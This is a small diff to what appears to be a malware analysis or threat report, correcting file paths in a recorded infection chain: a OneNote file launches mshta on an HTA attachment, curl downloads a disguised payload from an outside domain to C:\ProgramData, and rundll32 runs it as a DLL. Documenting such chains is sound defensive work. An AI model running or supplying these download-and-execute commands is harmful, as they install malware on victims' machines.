@@ -16,9 +16,9 @@ ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\215070.one
 
 mshta.exe C:\Users\Admin\AppData\Local\Temp\attachment.hta
 
-curl -output C:ProgramData\512.png --url https://energizett.com/1llNOC1/300123.gif
+curl -output C:\ProgramData\512.png --url https://energizett.com/1llNOC1/300123.gif
 
-rundll32.exe C:ProgramData\512.png,Wind
+rundll32.exe C:\ProgramData\512.png,Wind
 
 *************************************************
 
